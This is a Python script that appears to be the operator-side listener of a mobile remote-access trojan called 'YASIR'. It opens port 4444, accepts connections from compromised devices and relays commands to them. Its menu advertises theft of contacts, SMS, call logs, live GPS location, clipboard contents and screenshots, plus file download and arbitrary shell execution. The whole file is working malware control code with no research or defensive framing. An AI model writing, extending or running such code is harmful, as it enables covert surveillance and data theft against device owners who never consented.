#!/usr/bin/env python3
# YASIR - Ultimate Info & Control
import socket, threading, os, sys, time, json

HOST = '0.0.0.0'
PORT = 4444

def banner():
    print("""
\033[1;36m
  __   __  _______  __
  \ \ / / |__   __| \ \ 
   \ V /     | |     \ \ 
    > <      | |     / / 
   / . \     | |    / /  
  /_/ \_\    |_|   /_/   
                        
  \033[1;32mYASIR v1.0 - Ultimate Control\033[0m
\033[1;33m================================\033[0m
    """)

def style(data, title):
    """Style output in box"""
    line = "═" * 50
    return f"""
\033[1;36m╔{line}╗
║ \033[1;33m{title:^46}\033[1;36m ║
╚{line}╝\033[0m
{data}
\033[1;36m{line}\033[0m
"""

def handle(conn, addr):
    print(f"\033[1;32m[+] Connected: {addr[0]}\033[0m")
    
    while True:
        try:
            cmd = input("\033[1;34mYASIR>\033[0m ").strip()
            
            if cmd == 'exit':
                conn.send(b'exit')
                break
                
            elif cmd == 'help':
                print("""
\033[1;33m╔══════════════════════════════════════╗
║          YASIR COMMANDS              ║
╠══════════════════════════════════════╣
║ \033[1;36minfo\033[0m      - Full device info      ║
║ \033[1;36mcontacts\033[0m  - All contacts             ║
║ \033[1;36msms\033[0m       - SMS inbox                ║
║ \033[1;36mcalls\033[0m     - Call history             ║
║ \033[1;36mapps\033[0m      - All installed apps       ║
║ \033[1;36mlocation\033[0m  - Live GPS location        ║
║ \033[1;36mnetwork\033[0m   - Network info             ║
║ \033[1;36mbattery\033[0m   - Battery status           ║
║ \033[1;36mstorage\033[0m   - Storage info             ║
║ \033[1;36mprocess\033[0m   - Running processes        ║
║ \033[1;36mshell\033[0m     - Run any command          ║
║ \033[1;36mclipboard\033[0m - Clipboard content        ║
║ \033[1;36mscreenshot\033[0m- Take screenshot          ║
║ \033[1;36mdownload\033[0m  - Download file            ║
║ \033[1;36mtoast\033[0m     - Show notification        ║
║ \033[1;36mexit\033[0m      - Close connection         ║
╚══════════════════════════════════════╝
                """)
            
            elif cmd == '':
                continue
                
            else:
                conn.send(cmd.encode())
                time.sleep(1)
                
                # Receive response
                resp = b''
                conn.settimeout(3)
                try:
                    while True:
                        chunk = conn.recv(65536)
                        if not chunk: break
                        resp += chunk
                        if len(chunk) < 65536: break
                except:
                    pass
                conn.settimeout(None)
                
                if resp:
                    print(resp.decode(errors='replace'))
                else:
                    print("[-] No response")
                    
        except KeyboardInterrupt:
            print("\n[-] Closing...")
            conn.send(b'exit')
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    conn.close()

def start():
    banner()
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    
    print(f" Listening on {HOST}:{PORT}")
    print(" Waiting for connection...\n")
    
    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=handle, args=(conn, addr))
        t.daemon = True
        t.start()

if __name__ == '__main__':
    start()
